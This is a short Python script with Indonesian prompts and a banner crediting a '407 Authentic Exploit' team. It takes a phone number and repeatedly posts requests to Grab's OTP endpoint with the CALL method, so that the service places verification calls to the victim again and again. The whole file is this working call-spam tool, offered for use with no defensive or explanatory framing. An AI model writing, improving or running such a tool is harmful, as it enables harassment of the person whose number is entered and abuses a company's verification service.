#python3
import os
from time import sleep
try:
   import requests
except ImportError:
   os.system('pip install requests')

def keluar():
    asw = input("ingin melanjutkan [y/t] -> ")
    if asw == 't' or asw == 'T':
       os.system("clear")
       exit()
    else:
       if asw == 'y' or asw == 'Y':
          os.system("clear")
          print(banner)
          print("masukkan nomer dengan (628xxxxxxxxx)")
          menu()
       
#banner
banner = """
  ╔══╗╔═╗╔══╗╔═╦═╗╔══╗╔═╗╔╗─╔═╗╔═╗╔═╗╔═╦╗
  ║══╣║╬║║╔╗║║║║║║╚╗╔╝║╦╝║║─║╦╝║╬║║║║║║║║
  ╠══║║╔╝║╠╣║║║║║║─║║─║╩╗║╚╗║╩╗║╔╝║║║║║║║
  ╚══╝╚╝─╚╝╚╝╚╩═╩╝─╚╝─╚═╝╚═╝╚═╝╚╝─╚═╝╚╩═╝
}------------{Author : Ibar052}------------{
}-------------{Code : Python3}-------------{
}------{Team : 407 Authentic Exploit}------{
"""
os.system("clear")
print(banner)
print("masukkan nomer dengan (628xxxxxxxxx)")

def menu():
    nomer = input("masukkan nomer : ")
    req = requests.post("https://api.grab.com/grabid/v1/phone/otp",data={"method":"CALL","countryCode":"id","phoneNumber":nomer,"templateID":"pax_android_production"}).text
    if 'error' in req:
       print("[x] gagal ->",nomer)
       keluar()
    else:
       print("[√] sukses ->",nomer)
       keluar()

if __name__ == "__main__":
     while(True):
         menu()